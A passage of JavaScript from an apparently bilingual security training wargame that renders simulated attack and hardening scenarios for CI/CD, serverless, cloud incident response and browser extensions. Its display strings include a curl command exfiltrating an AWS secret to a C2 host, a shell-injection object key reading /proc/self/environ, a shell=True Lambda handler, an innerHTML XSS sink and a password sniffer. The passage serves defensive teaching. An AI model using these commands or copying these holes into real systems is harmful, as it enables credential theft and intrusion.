        manifestBadge.className = "token-tag token-inj";
        attestBadge.textContent = "BUILD: POISONED";
        attestBadge.className = "token-tag token-inj";
      }

    } else if (mode === "pwn_request"){
      manifestText =
        "[CI/CD Workflow Hazard Evaluation]:\n" +
        "  Workflow: .github/workflows/ci.yml\n" +
        "  Trigger: on.pull_request_target (Privileged context)\n" +
        "  Checked-out Ref: ${{ github.event.pull_request.head.ref }} (Untrusted Fork!)\n" +
        "  Exposed Secrets: AWS_SECRET_ACCESS_KEY, GITHUB_TOKEN\n" +
        "[Pwn Request Execution Trace]:\n" +
        "  Adversary submitted PR modifying package.json test script:\n" +
        "  curl -X POST https://c2.leak.net/ -d \"$AWS_SECRET_ACCESS_KEY\"";

      if (policy === "slsa3_cosign_enforce" || policy === "scoped_hash_pinned"){
        manifestText += "\n\n[Hardened Pipeline Architecture]:\n" +
          "  ✓ Switched untrusted trigger to unprivileged 'pull_request'.\n" +
          "  ✓ Secrets decoupled from fork PR checkout context.";
        attestText =
          "[CI/CD Security Isolation]:\n" +
          "  - Fork Runner Privilege: UNPRIVILEGED READ-ONLY\n" +
          "  - Secret Access: DENIED FOR FORK WORKFLOWS\n" +
          "Verdict: 🛡️ PWN REQUEST MITIGATED & SECRETS PROTECTED";
        manifestBadge.textContent = "RUNNER: HARDENED";
        manifestBadge.className = "token-tag token-lit";
        attestBadge.textContent = "SECRETS: SAFE";
        attestBadge.className = "token-tag token-lit";
      } else {
        attestText =
          "[CI/CD Security Isolation]:\n" +
          "  - Fork Runner Privilege: PRIVILEGED WRITE ACCESS\n" +
          "  - Secret Exfiltration: AWS credentials compromised\n" +
          "Verdict: 🚨 CI/CD RUNNER POISONING (PWN REQUEST COMPROMISE)";
        manifestBadge.textContent = "RUNNER: POISONED";
        manifestBadge.className = "token-tag token-inj";
        attestBadge.textContent = "SECRETS: LEAKED";
        attestBadge.className = "token-tag token-inj";
      }

    } else { // slsa_clean
      manifestText =
        "[CycloneDX 1.6 Cryptographic SBOM Manifest]:\n" +
        "  Artifact: " + pkg + "\n" +
        "  Digest: sha256:4a8f9c12b7e53d0684a1e90f2b6c7d1e8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f\n" +
        "  Components: 42 verified packages (0 critical CVEs)\n" +
        "  Base Image: cgr.dev/chainguard/static:latest (Distroless minimal)\n" +
        "  VEX Statement: All known vulnerabilities marked not_affected (unreachable)";

      attestText =
        "[Sigstore Cosign & SLSA Level 3 Attestation]:\n" +
        "  - Issuer OIDC: https://token.actions.githubusercontent.com\n" +
        "  - Workflow Subject: https://github.com/corp-org/backend-api/.github/workflows/build.yml\n" +
        "  - Rekor Log Index: 12894562 (Inclusion Proof Verified!)\n" +
        "  - SLSA Provenance: SLSA_BUILD_LEVEL_3 (Hermetic, Isolated, Parameterless)\n" +
        "  - Admission Webhook: 200 OK (Deployment permitted to production cluster)\n" +
        "Verdict: 🟢 100% SLSA L3 & REKOR CRYPTOGRAPHICALLY VERIFIED";
      manifestBadge.textContent = "SBOM: CLEAN";
      manifestBadge.className = "token-tag token-lit";
      attestBadge.textContent = "SLSA: LEVEL 3 VERIFIED";
      attestBadge.className = "token-tag token-lit";
    }

    manifestOut.textContent = manifestText;
    attestOut.textContent = attestText;
  }

  // --- 12. Serverless & Warm Container Inspector ---
  let currentServerlessScenario = "event_inject";

  function renderServerless(scenario){
    if (scenario) currentServerlessScenario = scenario;
    const keyEl = document.getElementById("serverlessKeyInput");
    const runtimeEl = document.getElementById("serverlessRuntimeSelect");
    const traceBadge = document.getElementById("serverlessTraceBadge");
    const verdictBadge = document.getElementById("serverlessVerdictBadge");
    const traceOut = document.getElementById("serverlessTraceOutput");
    const verdictOut = document.getElementById("serverlessVerdictOutput");

    if (!keyEl || !runtimeEl || !traceBadge || !verdictBadge || !traceOut || !verdictOut) return;

    if (scenario === "event_inject"){
      keyEl.value = "invoices/2026_q1.pdf; cat /proc/self/environ";
    } else if (scenario === "warm_container"){
      keyEl.value = "receipts/statement.png";
    } else if (scenario === "iam_escalate"){
      keyEl.value = "admin/sts_assume_role_query";
    } else if (scenario === "runtime_harden"){
      keyEl.value = "sanitized/clean_contract.pdf";
      runtimeEl.value = "immutable_container";
    }

    const key = keyEl.value.trim();
    const runtime = runtimeEl.value;
    const mode = currentServerlessScenario;

    let traceText = "";
    let verdictText = "";

    const hasShellMeta = /[;&|`$><\(\)]/.test(key);

    if (mode === "event_inject"){
      traceText =
        "[S3 ObjectCreated Event Notification AST]:\n" +
        "  Event: s3:ObjectCreated:Put\n" +
        "  Bucket: arn:aws:s3:::corp-invoices-2026\n" +
        "  ObjectKey: " + key + "\n" +
        "[Lambda Execution Handler Trace]:\n" +
        "  def handler(event, context):\n" +
        "    s3_key = event['Records'][0]['s3']['object']['key']\n" +
        "    # Vulnerable command construction:\n" +
        "    cmd = f\"pdftotext /tmp/{s3_key} /tmp/output.txt\"\n" +
        "    subprocess.run(cmd, shell=True)\n" +
        "[Shell Subprocess Tokenizer]:\n" +
        (hasShellMeta ? "  ⚠️ Command Metacharacter Detected: Execution flow chained!" : "  ✓ Safe alphanumeric path tokens parsed.");

      if (runtime === "hardened_microvm" || runtime === "immutable_container"){
        traceText += "\n\n[Firecracker Hardened Validator Gate]:\n" +
          "  ✓ Strict Regex Enforced: ^[a-zA-Z0-9_\\-\\./]+$\n" +
          "  ✓ Command Metacharacters Rejected: 400 Bad Request.";
        verdictText =
          "[Runtime Ingestion Gate]:\n" +
          "  - Event Validation: 400 BAD REQUEST (Metacharacters Rejected)\n" +
          "  - Subprocess Execution: PREVENTED\n" +
          "  - Environment Variables: PROTECTED\n" +
          "Verdict: 🛡️ S3 EVENT INJECTION BLOCKED & HARDENED";
        traceBadge.textContent = "VALIDATION: PASSED";
        traceBadge.className = "token-tag token-lit";
        verdictBadge.textContent = "VERDICT: SECURE";
        verdictBadge.className = "token-tag token-lit";
      } else {
        verdictText =
          "[MicroVM Subprocess Sandbox Escape]:\n" +
          "  - Execution Context: uid=993(sbx_user1051) gid=990(sbx_user1051)\n" +
          "  - Injected Shell Command: " + (hasShellMeta ? key.split(/[;&|]/).slice(1).join(";") : "none") + "\n" +
          "  - Process Memory: Dumped AWS_ACCESS_KEY_ID, AWS_SECRET_ACCESS_KEY, AWS_SESSION_TOKEN\n" +
          "Verdict: 🚨 S3 EVENT INJECTION RCE & CREDENTIAL EXFILTRATION";
        traceBadge.textContent = "VALIDATION: BYPASS";
        traceBadge.className = "token-tag token-inj";
        verdictBadge.textContent = "VERDICT: EXPLOITED";
        verdictBadge.className = "token-tag token-inj";
      }

    } else if (mode === "warm_container"){
      traceText =
        "[Warm Container Execution Lifecycle]:\n" +
        "  Container ID: microvm-warm-88421c (Reused across 4 invocations)\n" +
        "  Ephemeral Storage: /tmp (512 MB mounted ext4)\n" +
        "  Handler Invocation 1 (User A): Stored user_session_token.jwt into /tmp\n" +
        "  Handler Invocation 2 (Attacker): Inspected /tmp directory contents\n" +
        "[Artifact Residency Scan]:\n" +
        "  /tmp/session_token.json (size: 418 bytes, mode: 0644)\n" +
        "  /tmp/cached_auth.db (size: 1.2 MB, mode: 0644)";

      if (runtime === "immutable_container" || runtime === "hardened_microvm"){
        traceText += "\n\n[Ephemeral Storage Scrubbing Hook]:\n" +
          "  ✓ shred -u /tmp/* executed on handler exit.\n" +
          "  ✓ Zero residual state between concurrent tenant invocations.";
        verdictText =
          "[MicroVM Isolation & Scrubbing]:\n" +
          "  - Ephemeral /tmp Scrubbing: ACTIVE (0 files residual)\n" +
          "  - Cross-Tenant Memory Isolation: ENFORCED\n" +
          "  - Session Carving Attempt: 404 NOT FOUND\n" +
          "Verdict: 🛡️ WARM CONTAINER RESIDUE ELIMINATED";
        traceBadge.textContent = "WARM SBX: CLEAN";
        traceBadge.className = "token-tag token-lit";
        verdictBadge.textContent = "DATA: ISOLATED";
        verdictBadge.className = "token-tag token-lit";
      } else {
        verdictText =
          "[Warm Container Data Residue Vulnerability]:\n" +
          "  - Ephemeral /tmp Scrubbing: DISABLED (Default Lambda)\n" +
          "  - Residual Session Leak: Extracted User A JWT bearer token from /tmp\n" +
          "  - Account Takeover: Attacker forged User A requests\n" +
          "Verdict: 💥 WARM CONTAINER DATA LEAK & SESSION TAKEOVER";
        traceBadge.textContent = "WARM SBX: RESIDUE";
        traceBadge.className = "token-tag token-inj";
        verdictBadge.textContent = "DATA: LEAKED";
        verdictBadge.className = "token-tag token-inj";
      }

    } else if (mode === "iam_escalate"){
      traceText =
        "[Lambda Execution Role & STS Token Inspection]:\n" +
        "  Role ARN: arn:aws:iam::123456789012:role/CorpLambdaInvoiceRole\n" +
        "  STS Endpoint: https://sts.amazonaws.com/\n" +
        "  Target Policy Action: sts:AssumeRole\n" +
        "  Target Role: arn:aws:iam::123456789012:role/CorpAdministrator\n" +
        "[IAM Policy Evaluation Tree]:\n" +
        "  Statement[0]: Effect: Allow, Action: ['sts:AssumeRole'], Resource: '*'\n" +
        "  Wildcard Target: Permitted to assume any enterprise IAM role!";

      if (runtime === "hardened_microvm" || runtime === "immutable_container"){
        traceText += "\n\n[Scoped Least Privilege IAM Policy]:\n" +
          "  ✓ Action restricted strictly to s3:GetObject on specific bucket.\n" +
          "  ✓ sts:AssumeRole denied by Organization Service Control Policy (SCP).";
        verdictText =
          "[IAM STS Authorization Verdict]:\n" +
          "  - Target Role: arn:aws:iam::123456789012:role/CorpAdministrator\n" +
          "  - Evaluation: 403 ACCESS DENIED (Least Privilege Enforced)\n" +
          "  - Privilege Escalation Path: SEVERED\n" +
          "Verdict: 🛡️ IAM LEAST PRIVILEGE ENFORCED & ESCALATION BLOCKED";
        traceBadge.textContent = "IAM: SCOPED";
        traceBadge.className = "token-tag token-lit";
        verdictBadge.textContent = "STS: DENIED (403)";
        verdictBadge.className = "token-tag token-lit";
      } else {
        verdictText =
          "[IAM Privilege Escalation Chain]:\n" +
          "  - AssumeRole Status: 200 OK\n" +
          "  - Acquired Credentials: AWS_ACCESS_KEY_ID (ASIA...), RoleArn: CorpAdministrator\n" +
          "  - Blast Radius: Complete AWS cloud account compromise\n" +
          "Verdict: 🚨 OVERPRIVILEGED IAM ROLE ESCALATION TO CLOUD ADMIN";
        traceBadge.textContent = "IAM: OVERPRIVILEGED";
        traceBadge.className = "token-tag token-inj";
        verdictBadge.textContent = "STS: ASSUMED (200)";
        verdictBadge.className = "token-tag token-inj";
      }

    } else { // runtime_harden
      traceText =
        "[Serverless Defense-in-Depth Architecture]:\n" +
        "  1. Input Gate: Strict JSON Schema + Alphanumeric Key Validation\n" +
        "  2. Filesystem: Immutable ReadOnlyRootFilesystem (Container/MicroVM)\n" +
        "  3. Ephemeral Storage: /tmp Automated Scrubbing on Handler Exit\n" +
        "  4. IAM Governance: Scoped Resource ARN & SCP Guardrails\n" +
        "  5. Observability: GuardDuty Runtime & CloudTrail Telemetry Monitoring";

      verdictText =
        "[Firecracker & OCI Defense-in-Depth Summary]:\n" +
        "  - Event Injection: MITIGATED (Zero shell invocation)\n" +
        "  - Warm Container Leaks: NEUTRALIZED (Ephemeral shred hook)\n" +
        "  - IAM Escalation: PREVENTED (Least privilege scoping)\n" +
        "  - Root Filesystem: READ-ONLY (EroFS immutable layer)\n" +
        "Verdict: 🟢 100% SERVERLESSGUARD RUNTIME HARDENING ENFORCED";
      traceBadge.textContent = "RUNTIME: IMMUTABLE";
      traceBadge.className = "token-tag token-lit";
      verdictBadge.textContent = "POSTURE: 100% COMPLIANT";
      verdictBadge.className = "token-tag token-lit";
    }

    traceOut.textContent = traceText;
    verdictOut.textContent = verdictText;
  }

  /* ===== 13. Cloud IR & VPC Flow Logs Inspector ===== */
  let currentCloudIRScenario = "cloudtrail_audit";

  function renderCloudIR(scenario){
    if (scenario) currentCloudIRScenario = scenario;
    const filterEl = document.getElementById("cloudirFilterInput");
    const sourceEl = document.getElementById("cloudirSourceSelect");
    const traceBadge = document.getElementById("cloudirTraceBadge");
    const verdictBadge = document.getElementById("cloudirVerdictBadge");
    const traceOut = document.getElementById("cloudirTraceOutput");
    const verdictOut = document.getElementById("cloudirVerdictOutput");

    if (!filterEl || !sourceEl || !traceBadge || !verdictBadge || !traceOut || !verdictOut) return;

    if (scenario === "cloudtrail_audit"){
      filterEl.value = "eventSource:iam.amazonaws.com AND eventName:AttachUserPolicy";
      sourceEl.value = "cloudtrail_mgmt";
    } else if (scenario === "sts_exfil"){
      filterEl.value = "bucketName:corp-customer-pii-vault AND httpStatus:200";
      sourceEl.value = "s3_data_access";
    } else if (scenario === "vpc_c2"){
      filterEl.value = "srcaddr:10.0.4.15 AND dstport:8443";
      sourceEl.value = "vpc_netflow";
    } else if (scenario === "soar_contain"){
      filterEl.value = "severity >= 8.0 AND status:ACTIVE";
      sourceEl.value = "guardduty_asff";
    }

    const mode = currentCloudIRScenario;
    let traceText = "";
    let verdictText = "";

    if (mode === "cloudtrail_audit"){
      traceText =
        "[CloudTrail Management Event Trace (Athena Partition Filter)]:\n" +
        "  Event ID: evt-99482-admin-escalation\n" +
        "  Event Time: 2026-10-17T02:44:19Z\n" +
        "  Event Name: AttachUserPolicy\n" +
        "  Event Source: iam.amazonaws.com\n" +
        "  Source IP: 198.51.100.77 (⚠️ Unknown External IP / Non-RFC1918)\n" +
        "  User Agent: aws-cli/2.15.15 Python/3.11.6 Linux/6.5.0-kali3-amd64\n" +
        "  Target User: backup-svc-account\n" +
        "  Attached Policy: arn:aws:iam::aws:policy/AdministratorAccess\n" +
        "  MFA Authenticated: false (Direct API invocation)";
      verdictText =
        "[Control Plane Anomaly Detection Verdict]:\n" +
        "  - Privilege Delta: Low-priv service account -> Full Cloud Admin\n" +
        "  - Threat Classification: Initial Access & Persistence (MITRE T1078.004 / T1098)\n" +
        "  - Immediate Risk: Account-wide total resource takeover\n" +
        "Verdict: 🚨 CRITICAL: UNAUTHORIZED PRIVILEGE ESCALATION VIA CLOUDTRAIL";
      traceBadge.textContent = "CLOUDTRAIL: ANOMALY";
      traceBadge.className = "token-tag token-inj";
      verdictBadge.textContent = "ATTACK: PRIV ESC";
      verdictBadge.className = "token-tag token-inj";

    } else if (mode === "sts_exfil"){
      traceText =
        "[Amazon S3 Access Log & STS Session Correlation]:\n" +
        "  Bucket: s3://corp-customer-pii-vault\n" +
        "  Requester Identity: arn:aws:sts::123456789012:assumed-role/DataSyncRole/exfil-session-shadow-ops\n" +
        "  STS Access Key ID: ASIA99CLOUDEXFIL2026 (Ephemeral Credential)\n" +
        "  Client IP: 198.51.100.77\n" +
        "  Exfiltrated Objects:\n" +
        "    - customer_ssn_2026.parquet (18.45 MB) -> HTTP 200 OK\n" +
        "    - financial_records_q3.csv (14.21 MB) -> HTTP 200 OK\n" +
        "    - private_keys_backup.tar.gz (14.63 MB) -> HTTP 200 OK\n" +
        "  Total Exfiltration Volume: 47.29 MB (3 objects, 100% successful)";
      verdictText =
        "[S3 Data Exfiltration Forensic Assessment]:\n" +
        "  - Stolen Credential Vector: Instance metadata (IMDSv1) scraping\n" +
        "  - Scope: Regulatory PII & Corporate Cryptographic Keys\n" +
        "  - Impact: Major regulatory breach (GDPR / HIPAA / PIPA)\n" +
        "Verdict: 🚨 S3 VAULT EXFILTRATION TRACED TO COMPROMISED STS SESSION";
      traceBadge.textContent = "S3 ACCESS: EXFILTRATED";
      traceBadge.className = "token-tag token-inj";
      verdictBadge.textContent = "DATA LEAK: 47.3 MB";
      verdictBadge.className = "token-tag token-inj";

    } else if (mode === "vpc_c2"){
      traceText =
        "[VPC Flow Logs Network Correlation (ENI eni-0feebda123456789c)]:\n" +
        "  Internal Infected Host: 10.0.4.15 (Private Subnet)\n" +
        "  External Destination IP: 203.0.113.89 (Threat Intel Known C2)\n" +
        "  Destination Port: 8443 (TCP Protocol 6)\n" +
        "  Recorded Flow Sessions:\n" +
        "    - 00:16:40: 10.0.4.15:49152 -> 203.0.113.89:8443 (24 pkts, 8192 bytes, ACCEPT OK)\n" +
        "    - 00:17:41: 10.0.4.15:49153 -> 203.0.113.89:8443 (24 pkts, 8192 bytes, ACCEPT OK) [Δt = 61s]\n" +
        "    - 00:18:39: 10.0.4.15:49154 -> 203.0.113.89:8443 (24 pkts, 8192 bytes, ACCEPT OK) [Δt = 58s]\n" +
        "    - 00:19:40: 10.0.4.15:49155 -> 203.0.113.89:8443 (24 pkts, 8192 bytes, ACCEPT OK) [Δt = 61s]\n" +
        "    - 00:20:42: 10.0.4.15:49156 -> 203.0.113.89:8443 (24 pkts, 8192 bytes, ACCEPT OK) [Δt = 62s]\n" +
        "  Statistical Variance: Mean = 60.5s, Jitter StdDev = 1.66s (High periodicity)";
      verdictText =
        "[Network Behavioral Threat Correlation]:\n" +
        "  - Protocol: Encrypted Outbound C2 Heartbeat Session\n" +
        "  - Beacon Classification: Cobalt Strike / Mythic Agent Profile\n" +
        "  - Immediate Containment Action: Revoke egress routes & quarantine SG\n" +
        "Verdict: 📡 PERIODIC C2 BEACON CONFIRMED ACROSS VPC FLOW LOGS";
      traceBadge.textContent = "VPC FLOW: C2 BEACON";
      traceBadge.className = "token-tag token-inj";
      verdictBadge.textContent = "BEACON: 60s INTERVAL";
      verdictBadge.className = "token-tag token-inj";

    } else { // soar_contain
      traceText =
        "[GuardDuty Active Findings (ASFF Standard)]:\n" +
        "  Finding 1: UnauthorizedAccess:IAMUser/InstanceCredentialExfiltration.OutsideAWS (Sev: 8.0)\n" +
        "  Finding 2: Trojan:EC2/DNSDataExfiltration (Sev: 8.5)\n" +
        "[Automated SOAR Multi-Layer Containment Playbook Triggered]:\n" +
        "  ✓ [IAM Layer] Attached Inline Revocation: aws:TokenIssueTime < 2026-10-17T03:30:00Z\n" +
        "  ✓ [SCP Layer] Enforced Explicit Deny Permission Boundary on DataSyncRole\n" +
        "  ✓ [Network Layer] Replaced ENI SGs with sg-quarantine (0.0.0.0/0 blocked)\n" +
        "  ✓ [Forensic Layer] Captured immutable EBS snapshot snap-forensic-20261017";
      verdictText =
        "[SOAR Containment Execution Summary]:\n" +
        "  - Stolen STS Token Status: REVOKED (All subsequent calls fail with 403)\n" +
        "  - C2 Egress Channel: TERMINATED (TCP resets injected by quarantine SG)\n" +
        "  - Evidence Preservation: COMPLETE (EBS snapshot encrypted with forensic CMK)\n" +
        "  - Containment Status: 100% CONTAINED\n" +
        "Verdict: 🟢 MULTI-LAYER CLOUD SOAR CONTAINMENT PLAYBOOK EXECUTED";
      traceBadge.textContent = "SOAR: EXECUTED";
      traceBadge.className = "token-tag token-lit";
      verdictBadge.textContent = "INCIDENT: CONTAINED";
      verdictBadge.className = "token-tag token-lit";
    }

    traceOut.textContent = traceText;
    verdictOut.textContent = verdictText;
  }

  /* ===== 14. Browser Extension Security Inspector ===== */
  let currentExtSecScenario = "manifest_audit";

  function renderExtSec(scenario){
    if (scenario) currentExtSecScenario = scenario;
    const targetEl = document.getElementById("extsecTargetInput");
    const auditEl = document.getElementById("extsecAuditVectorSelect");
    const traceBadge = document.getElementById("extsecTraceBadge");
    const verdictBadge = document.getElementById("extsecVerdictBadge");
    const traceOut = document.getElementById("extsecTraceOutput");
    const verdictOut = document.getElementById("extsecVerdictOutput");

    if (!targetEl || !auditEl || !traceBadge || !verdictBadge || !traceOut || !verdictOut) return;

    if (scenario === "manifest_audit"){
      targetEl.value = "chrome-extension://corp-extension/manifest.json";
      auditEl.value = "manifest_perms";
    } else if (scenario === "war_leak"){
      targetEl.value = "chrome-extension://corp-extension/assets/auth_config.json";
      auditEl.value = "war_resources";
    } else if (scenario === "dom_xss"){
      targetEl.value = "chrome-extension://corp-extension/content.js";
      auditEl.value = "content_script_sinks";
    } else if (scenario === "dnr_harden"){
      targetEl.value = "chrome-extension://corp-extension/rules.json";
      auditEl.value = "dnr_csp_posture";
    }

    const mode = currentExtSecScenario;
    let traceText = "";
    let verdictText = "";

    if (mode === "manifest_audit"){
      traceText =
        "[Manifest V3 Security Audit (manifest.json)]:\n" +
        "  Extension Name: Corporate Productivity Suite (v1.4.2)\n" +
        "  Manifest Version: 3\n" +
        "  Background Context: Service Worker (background.js, type: module)\n" +
        "  Requested Permissions:\n" +
        "    - <all_urls> (🚨 Overprivileged Host Access)\n" +
        "    - webRequestBlocking (⚠️ Disallowed blocking mode in MV3)\n" +
        "    - cookies (⚠️ Unrestricted cross-origin cookie access)\n" +
        "    - storage, tabs\n" +
        "  Host Permissions: ['*://*/*']\n" +
        "  Audit Finding: Overprivileged wildcard origin and legacy blocking permissions.";
      verdictText =
        "[Permission Posture Analysis]:\n" +
        "  - Host Scope: ENTIRE WEB (Zero domain fencing)\n" +
        "  - Risk: Silent DOM exfiltration across all user-visited domains\n" +
        "  - Background Worker: Ephemeral event-driven worker without state persistence\n" +
        "Verdict: 🚨 CRITICAL: OVERPRIVILEGED MANIFEST PERMISSIONS IDENTIFIED";
      traceBadge.textContent = "MANIFEST: HIGH RISK";
      traceBadge.className = "token-tag token-inj";
      verdictBadge.textContent = "AUDIT: FAILED";
      verdictBadge.className = "token-tag token-inj";

    } else if (mode === "war_leak"){
      traceText =
        "[Web Accessible Resources (WAR) Cross-Context Probe]:\n" +
        "  Target File: chrome-extension://corp-extension/assets/auth_config.json\n" +
        "  Declared Scope in Manifest: resources: ['assets/auth_config.json'], matches: ['<all_urls>']\n" +
        "  Extracted JSON Payload:\n" +
        "    {\n" +
        "      \"extension_id\": \"pwned_corp_extension_id_9988\",\n" +
        "      \"sso_client_id\": \"vibe-corp-client-prod\",\n" +
        "      \"master_token\": \"EXT_AUTH_TOKEN_779922AA\",\n" +
        "      \"telemetry_endpoint\": \"https://telemetry.internal.corp/collect\"\n" +
        "    }\n" +
        "  Extraction Method: External web origin fetch() without authentication";
      verdictText =
        "[Cross-Origin Resource Assessment]:\n" +
        "  - Root Cause: Wildcard '<all_urls>' match pattern in web_accessible_resources\n" +
        "  - Impact: Hardcoded master authentication secret compromised\n" +
        "  - Mitigation: Scope to specific trusted origins and enable use_dynamic_url\n" +
        "Verdict: 🔓 WAR SECRET EXFILTRATED VIA UNRESTRICTED MATCH PATTERN";
      traceBadge.textContent = "WAR: LEAKED";
      traceBadge.className = "token-tag token-inj";
      verdictBadge.textContent = "SECRET: EXT_AUTH_TOKEN";
      verdictBadge.className = "token-tag token-inj";

    } else if (mode === "dom_xss"){
      traceText =
        "[Content Script Injection & Sinks Analysis (content.js)]:\n" +
        "  Target Script: content.js (Runs in Isolated World on corporate pages)\n" +
        "  Vulnerable PostMessage Handler:\n" +
        "    window.addEventListener('message', (event) => {\n" +
        "      if (event.data?.type === 'RENDER_PROMO') {\n" +
        "        // VULNERABLE: Direct innerHTML assignment from external origin\n" +
        "        promoDiv.innerHTML = event.data.htmlPayload;\n" +
        "      }\n" +
        "    });\n" +
        "  Credential Interception Sniffer:\n" +
        "    input[type='password'].addEventListener('input', (e) => {\n" +
        "      chrome.storage.local.set({ harvested_password: e.target.value });\n" +
        "    });";
      verdictText =
        "[Content Script Vulnerability Assessment]:\n" +
        "  - DOM Sink: promoDiv.innerHTML (DOM-based XSS via postMessage)\n" +
        "  - Origin Verification: MISSING (Accepts postMessage from any web page)\n" +
        "  - Malicious Sniffer: In-line keystroke harvesting on password fields\n" +
        "Verdict: 💉 CONTENT SCRIPT DOM XSS & CREDENTIAL SNIFFING CONFIRMED";
      traceBadge.textContent = "CONTENT SCRIPT: VULNERABLE";
      traceBadge.className = "token-tag token-inj";
      verdictBadge.textContent = "SINK: innerHTML XSS";
      verdictBadge.className = "token-tag token-inj";

    } else { // dnr_harden
      traceText =
        "[ExtensionGuard Defense-in-Depth Hardening Applied]:\n" +
        "  ✓ [Network Layer] Replaced webRequestBlocking with Declarative Net Request (DNR)\n" +
        "  ✓ [Resource Layer] Scoped web_accessible_resources to 'https://*.internal.corp/*'\n" +
        "  ✓ [Isolation Layer] Enforced strict Isolated World; removed innerHTML sinks\n" +
        "  ✓ [CSP Layer] Enforced script-src 'self'; object-src 'self'; (Zero dynamic eval)";
      verdictText =
        "[ExtensionGuard Compliance & Security Summary]:\n" +
        "  - Declarative Net Request: ACTIVE (Zero synchronous thread blocking)\n" +
        "  - WAR Resource Access: RESTRICTED & DYNAMIC URL ENABLED\n" +
        "  - DOM Sanitization: DOMPurify enforced; password sniffing eradicated\n" +
        "  - Remote Code Execution: 100% BLOCKED by Extension CSP\n" +
        "Verdict: 🟢 100% EXTENSIONGUARD HARDENED POSTURE ENFORCED";
      traceBadge.textContent = "DNR & CSP: ENFORCED";
      traceBadge.className = "token-tag token-lit";
      verdictBadge.textContent = "STATUS: HARDENED";
      verdictBadge.className = "token-tag token-lit";
    }

    traceOut.textContent = traceText;
    verdictOut.textContent = verdictText;
  }

  /* ===== export & import ===== */
  function exportJSON(){
    const payload = {
      v: 1,
      ts: Date.now(),
      solved: state.solved,
      hints: state.hints,
      badges: state.badges || {},
      lang: state.lang,
      sound: state.sound
    };
    try {
      const jsonStr = JSON.stringify(payload, null, 2);
      const blob = new Blob([jsonStr], { type: "application/json" });
      const url = URL.createObjectURL(blob);
      const a = document.createElement("a");
      const dateStr = new Date().toISOString().slice(0, 10);
      a.href = url;
      a.download = "vibe_wargame_backup_" + dateStr + ".json";
      document.body.appendChild(a);
      a.click();
      setTimeout(() => {
        document.body.removeChild(a);
        URL.revokeObjectURL(url);
      }, 300);
      showToast("💾", S("exportDone"), "vibe_wargame_backup_" + dateStr + ".json");
      print('<span class="ok">✓ ' + esc(S("exportDone")) + '</span>');
    } catch (e){
      printText("JSON 내보내기 실패 / JSON export failed: " + e.message, "err");
    }
  }

  function doExport(arg){
    const mode = (arg || "").trim().toLowerCase();
    if (mode === "json" || mode === "file"){
      exportJSON();
      return;
    }
    const payload = {
      v: 1,
      ts: Date.now(),
      solved: state.solved,
      hints: state.hints,
      badges: state.badges || {},
      lang: state.lang,
      sound: state.sound
    };
    let token = "";
    try {
      const raw = JSON.stringify(payload);
      token = "VIBE-" + btoa(unescape(encodeURIComponent(raw)));
    } catch (e) {
      printText("내보내기 실패 / Export failed: " + e.message, "err");
      return;
    }
    blank();
    print('<span class="bold ok">' + esc(S("exportHdr")) + '</span>');
    print('<span class="tbl"><span class="cmd-h" style="word-break:break-all;user-select:all;">' + esc(token) + '</span></span>');
    blank();
    print('<span class="dim">' + esc(S("exportTip")) + '</span>');
    print('<span class="dim">' + (L()==="ko" ? "Tip: 파일 백업은 `export json` 또는 상단 💾 버튼을 누르세요." : "Tip: For file backup, type `export json` or click the 💾 button.") + '</span>');
    blank();
  }

  function loadPayload(payload){
    if (!payload || typeof payload !== "object" || !payload.solved || typeof payload.solved !== "object"){
      throw new Error("Invalid payload structure");
    }
    const validIds = new Set(CHALLENGES.map(c => c.id));
    const cleanSolved = {};
    for (const [id, val] of Object.entries(payload.solved)){
      if (validIds.has(id) && val && typeof val === "object"){
        cleanSolved[id] = {
          earned: typeof val.earned === "number" ? val.earned : 0,
          at: val.at || Date.now()
        };
      }
    }
    const cleanHints = {};
    if (payload.hints && typeof payload.hints === "object"){
      for (const [id, count] of Object.entries(payload.hints)){
        if (validIds.has(id) && typeof count === "number"){
          cleanHints[id] = count;
        }
      }
    }
    const cleanBadges = {};
    if (payload.badges && typeof payload.badges === "object"){
      for (const [bid, bval] of Object.entries(payload.badges)){
        if (typeof bval === "object" && bval !== null){
          cleanBadges[bid] = bval;
        } else if (bval) {
          cleanBadges[bid] = { ts: Date.now() };
        }
      }
    }
    state.solved = cleanSolved;
    state.hints = cleanHints;
    state.badges = cleanBadges;
    if (payload.lang === "ko" || payload.lang === "en") state.lang = payload.lang;
    if (typeof payload.sound === "boolean") state.sound = payload.sound;
    save();
    refreshHud();
    checkAchievements(true);
    sGrant();
    blank();
    printText("✓ " + S("importDone") + " (" + S("solved") + ": " + solvedCount() + " / " + S("score") + ": " + totalScore() + ")", "ok");
    blank();
  }

  function doImport(arg){
    const token = (arg || "").trim();
    if (!token){
      const fileInput = document.getElementById("importFileInput");
      if (fileInput){
        fileInput.click();
        printText(L()==="ko" ? "파일 선택창을 열었습니다. (또는 `import <토큰>` 사용)" : "Opened file picker. (or use `import <token>`)", "dim");
        return;
      }
      printText(S("importUsage"), "warn");
      return;
    }
    let clean = token;
    if (clean.startsWith("VIBE-")) clean = clean.slice(5);
    try {
      let jsonStr;
      if (clean.startsWith("{")){
        jsonStr = clean;
      } else {
        jsonStr = decodeURIComponent(escape(atob(clean)));
      }
      const payload = JSON.parse(jsonStr);
      loadPayload(payload);
    } catch (e){
      sDeny();
      printText("╳ " + S("importErr"), "err");
    }
  }

  function importFromFile(file){
    if (!file) return;
    const reader = new FileReader();
    reader.onload = e => {
      try {
        const content = (e.target.result || "").trim();
        let payload;
        if (content.startsWith("{")){
          payload = JSON.parse(content);
        } else {
          let clean = content;
          if (clean.startsWith("VIBE-")) clean = clean.slice(5);
          payload = JSON.parse(decodeURIComponent(escape(atob(clean))));
        }
        loadPayload(payload);
        showToast("📂", S("importDone"), solvedCount() + "/" + CHALLENGES.length);
      } catch (err){
        sDeny();
        showToast("╳", S("importErr"), err.message);
        printText("╳ " + S("importErr"), "err");
      }
    };
    reader.readAsText(file);
  }

  function doSearch(arg){
    const q = (arg || "").trim().toLowerCase();
    if (!q){
      printText(S("searchUsage"), "warn");
      return;
    }
    const matched = CHALLENGES.filter(c => {
      return c.id.toLowerCase().includes(q) ||
        (c.cat && c.cat.toLowerCase().includes(q)) ||
        (c.track && c.track.toLowerCase().includes(q)) ||
        (c.title && c.title.ko && c.title.ko.toLowerCase().includes(q)) ||
        (c.title && c.title.en && c.title.en.toLowerCase().includes(q));
    });
    blank();
    if (!matched.length){
      printText(S("searchEmpty") + " " + arg, "dim");
      return;
    }
    print('<span class="bold">' + esc(S("searchHdr")) + ' (' + matched.length + ')</span>');
